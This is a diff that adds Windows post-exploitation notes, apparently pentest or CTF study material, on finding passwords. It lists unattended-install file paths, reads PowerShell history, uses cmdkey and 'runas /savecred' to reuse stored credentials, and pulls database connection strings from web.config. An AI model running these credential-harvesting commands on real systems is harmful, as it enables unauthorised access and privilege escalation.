@@ -1,8 +1,34 @@
+# Looking for Passwords:
+## unattended Windows Installations:
+	+ C:\Unattend.xml
+	+ C:\Windows\Panther\Unattend.xml
+	+ C:\Windows\Panther\Unattend\Unattend.xml
+	+ C:\Windows\system32\sysprep.inf
+	+ C:\Windows\system32\sysprep\sysprep.xml
+## Powershell History:
+```ps1
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+## Stored Creds:
+```ps1
+# list the sotred credentials
+cmdkey /list
+# run command as another user:
+runas /savecred /user:admin cmd.exe
+```
+## IIS Configurations:
+```ps1
+# looking for "web.config"
+C:\inetpub\wwwroot\web.config
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
+# quickly find database Creds:
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
 
 
-------------------- Active Directory and Kerberos attacks and qoutes >
 
 
+# Active Directory and Kerberos attacks and qoutes:
 
 				---Kerberos Communication---
 
